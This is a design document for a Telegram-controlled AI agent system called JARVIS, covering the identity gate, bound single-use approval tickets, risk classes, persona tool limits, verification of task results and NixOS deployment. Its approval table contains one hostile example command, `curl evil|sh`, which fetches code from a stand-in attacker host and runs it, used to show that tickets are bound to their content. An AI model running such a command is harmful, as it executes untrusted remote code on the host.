# Telegram control plane — missions, approvals, projects

The Telegram channel is the **remote interface** to the JARVIS. It receives
objectives in natural language, turns them into missions with persistent
tasks and dependencies, delegates each task to a persona through the
canonical `AgentRuntime`, verifies results against the world, and reports
back with evidence.

This document describes the implementation as it exists. Where an older
document or comment disagrees, the code wins.

---

## 1. Real execution flow

```
Telegram update
  │
  ├─ identity extracted (chat_id + from.id)
  ├─ IDEMPOTENCY: store.mark_seen("upd:<update_id>")      ← replay-safe
  │
  ├─ IdentityGate.authorize(ident, "read")                ← SINGLE GATE
  │     └─ wrong chat / wrong user / no allowlist → DROPPED (no reply)
  │
  ├─ /agent            → bounded worker pool (never the poll loop)
  └─ everything else   → handle_message()
        ├─ /ask, /status, /remember, /vault   → cheap deterministic paths
        ├─ /projects, /personas               → read-only inventory
        └─ /mission …                        → MissionStore + MissionRunner
              │
              ├─ resolve project      (projects.py — evidence, never a guess)
              ├─ decompose objective  (planner.py — LLM, deterministic fallback)
              ├─ PERSIST mission      (store.py — atomic write, BEFORE work)
              ├─ run in worker pool   (runner.py)
              │     └─ per task:
              │          persona → prompt + stage + tools (CODE-enforced)
              │          AgentRuntime.run(...)              ← canonical loop
              │          verify_task(...)                   ← world evidence
              │          diff snapshot before/after        ← attribution
              ├─ report + notify      (one message, not a tool-call flood)
              └─ on restart: recover_interrupted() + resume
```

There is **no second cognitive loop**. `MissionRunner` delegates every task
to `jarvis.runtime.agent_runtime.AgentRuntime`, which composes the canonical
`Agent`. Pinned by `tests/test_architecture.py`.

---

## 2. Security model

### 2.1 One gate, before any effect

`IdentityGate.authorize()` runs on every dispatch path. Previously
`/agent <task>` was dispatched onto a thread **before** `handle_message`
(the only place the chat allowlist lived), so any `chat_id` could run a
full agent. That path is gone.

`Identity` is mandatory: an update without `chat.id` + `from.id` is
rejected. A callback without `from.id` is rejected.

### 2.2 Chat AND user allowlist

`JARVIS_TELEGRAM_USER_ID` is **required** when the bot can be reached from
a group. With only `JARVIS_TELEGRAM_CHAT_ID`, *any member of that chat* is
authorized to start missions and approve operations. This is the single
most important configuration step.

### 2.3 Approval is a bound, single-use ticket

| Property | Behavior |
|---|---|
| Binding | (user_id, chat_id, operation, payload digest) |
| `callback_data` | `ap:<32-hex ticket id>:yes\|no` — never a bare `"yes"` |
| Replay | second `resolve()` refused (`already approved`) |
| Expiry | real TTL; expired tickets are refused and marked `EXPIRED` |
| Wrong content | approving `rm x` does not authorize `curl evil\|sh` |
| Redemption | `authorize_once()` consumes the ticket **once**, at execution time |

The presser's identity comes from the callback's `from`, never from the
bot's own message author.

### 2.4 Risk policy

`classify(operation)` → `ROUTINE` | `APPROVAL` | `DENY`.

- `ROUTINE` — reads, status, memory, listings: proceed automatically.
- `APPROVAL` — shell, write, git commit/push, deploy, nixos rebuild,
  sshkey, mission exec: require an owner ticket.
- `DENY` — sudo escalation, reboot/shutdown, vault keygen, store purge:
  refused **even with a ticket**.

Unknown operations default to `APPROVAL` (fail-closed): a new capability
must be declared `ROUTINE` to run unattended.

### 2.5 Concurrency

- One `IdentityGate` + one `ApprovalRegistry`, both lock-protected.
- `resolve()` is compare-and-set: exactly one press wins.
- Long work runs on `ThreadPoolExecutor(max_workers=2)`; the poll loop is
  never blocked and never spawns one thread per message.

---

## 3. Personas are applied, not just selected

| Persona field | How it reaches execution |
|---|---|
| `system_prompt_additions` | injected into the agent system context |
| `model_preference` | translated to `stage` in `model_requirements` → `model_policy.select_model` |
| `tools` | resolved via `ToolRegistry`, filtered by `filter_tools(persona)` |
| `can_write` / `can_execute` | enforced **in code**, not by prompt |
| actual usage | recorded on the task (`persona_applied`, `model_used`, `tools_used`) |

`model_preference` was previously **dead code**: the only mapping,
`provider_registry.route_for_persona`, is marked DEPRECATED with zero
production callers. It now flows through the canonical selection funnel.

If a task's criteria require writing but the persona lacks `can_write`, the
gap is recorded as evidence rather than silently granting the capability.

---

## 4. Verification and attribution

**Completion is never self-reported.** `verify_task()` checks each
acceptance criterion against the world:

| Criterion | Check |
|---|---|
| `file_exists` / `file_absent` | filesystem |
| `content_contains` | file content contains a needle |
| `test_passes` / `command_ok` | subprocess exit code (+ tail of output) |
| `diff_present` | the task actually changed something |
| `evidence_present` | commit or recorded evidence |
| unknown kind | **fails closed** |
| no criteria | **not verified** ("no verifiable acceptance criterion") |

A task with criteria that fail is retried with the failure evidence in
context, up to `max_attempts`, and only then marked `FAILED`. Retries are
limited to `TRANSIENT`, `TOOL`, `VALIDATION`, `CONTEXT_EXHAUSTION`;
`UNRECOVERABLE`, `PERMISSION` and `TASK_DEFECT` stop immediately.

**Change attribution** uses a dirty-tree snapshot before and after each
task; the report's "changed" list is the difference. A modification that
was already present (another agent, another session, the owner) is never
attributed to the current task. The old `git diff --name-only HEAD` approach
claimed all of it.

**Project scope** comes from the objective: cited paths, or a basename
search that skips `node_modules`/`__pycache__`/`vendor`/build dirs. The old
`os.listdir(root)` + `*.py` listing is removed.

---

## 5. Persistence and resume

One JSON file per mission, written atomically (tmp + rename) under
`JARVIS_MISSION_DIR` (service default `/var/lib/jarvis/missions`).

Modeled: `mission_id`, `task_id`, `parent_id`, `project`, `project_root`,
`persona_id` / `persona_applied`, `status`, `priority`, `dependencies`,
`acceptance_criteria`, `attempt`/`max_attempts`, `failure_class`,
timestamps, `checkpoint_ref`, `files_attributed`, `commit_sha`,
`verification_evidence`, `approval_ticket`, `last_error`,
`telegram_chat_id`.

Guarantees:

- **Persisted before prolonged work** — the mission exists on disk before
  the first task runs.
- **Valid transitions only** — an illegal transition is refused and logged,
  never silently applied.
- **Crash recovery** — `recover_interrupted()` returns tasks stuck in
  `RUNNING`/`VERIFYING`/`AWAITING_APPROVAL` to `READY` (nobody is executing
  them), and a `DONE` task is never reopened.
- **No duplicate execution** — updates are deduplicated by `update_id`
  (24h TTL) and the poll offset is persisted, so a restart does not replay
  buffered updates.
- **Cancel reaches execution** — `cancel()` sets a `threading.Event` the run
  loop observes, not just a status field.

---

## 6. Commands

```
/mission <objective>              start (auto-detect project)
/mission <project> <objective>     target a project explicitly
/mission                          list active missions
/mission show <id>                full report with evidence
/mission plan <objective>         decompose only, DO NOT execute
/mission pause|resume|cancel <id>  lifecycle
/mission steer <id> <msg>         redirect the running mission
/tasks [id]                       task states
/projects                         repos in the workspace
/personas [id]                    roles + capabilities
/approve [ticket]                 list / grant a pending approval

/ask <question>   cheapest path (fastpath/doctor/nixos/rag/agent)
/status           services, circuit breaker, running missions
/remember <fact>  episodic memory
/vault summarize|list
/agent <task>     single agent turn with approval buttons
/dev <task>       dev REPL
/opencode [-m prov/model] <task>
/sshkey <key.pub> install SSH key (requires approval)
/steer <msg> · /stop
/force_local · /force_remote
```

Commands are fuzzy: lowercase, with or without `/`, unambiguous prefix
(`/stat` → `/status`). Ambiguous prefixes return "unknown command" plus
help.

---

## 7. Enabling it (NixOS)

Declarative, no secrets in the store or repo:

```nix
services.jarvis-telegram = {
  enable = true;
  user = "nixos";                       # state owner
  stateDir = "/var/lib/jarvis/missions"; # durable, survives rebuilds
  memoryMax = "4G";                      # raised from 256M: missions load
                                        # the registry + queue in-process
};
```

Then create the credentials file **by hand**, outside the store:

```bash
sudo install -m 600 /dev/null /etc/jarvis-telegram.env
sudoedit /etc/jarvis-telegram.env
#   JARVIS_TELEGRAM_TOKEN=<from @BotFather>
#   JARVIS_TELEGRAM_CHAT_ID=<your chat id>
#   JARVIS_TELEGRAM_USER_ID=<your user id>   # REQUIRED in groups
sudo systemctl restart jarvis-telegram
```

Discover your ids by messaging the bot and calling
`https://api.telegram.org/bot<TOKEN>/getUpdates` (`chat.id`, `from.id`).

Sandbox: `ProtectSystem=strict` with `ReadWritePaths` for the mission and
JARVIS state dirs, `PrivateTmp`, `NoNewPrivileges`, `MemoryMax`, bounded
`TasksMax`. `Restart=always` (network flaps and token rotation are
expected). Secrets come from `EnvironmentFile` with the `-` prefix, so a
missing file leaves the service stopped instead of crash-looping.

Reception and execution are already separated: the process polls and hands
work to a bounded in-process pool, and every mission is durable, so
stopping the service never loses a mission.

---

## 8. Tests

| File | Covers |
|---|---|
| `tests/test_telegram_security.py` | gate, risk policy, ticket binding/replay/expiry, foreign-user callbacks, dispatch bypass |
| `tests/test_telegram_ops.py` | network failure, truncation, expired approval, concurrency, update idempotency, offset persistence, empty config |
| `tests/test_mission.py` | project resolution, decomposition, persistence, resume, dependencies, verification, attribution, persona application, lifecycle |
| `tests/test_architecture.py` | no parallel cognitive loop, single gate, bound callbacks, English model-facing text |

Run:

```bash
nix develop --command python3 -m pytest modules/ai/jarvis/tests/ -q
nix build .#jarvis          # sandbox check (tests marked @needs_git skip there)
```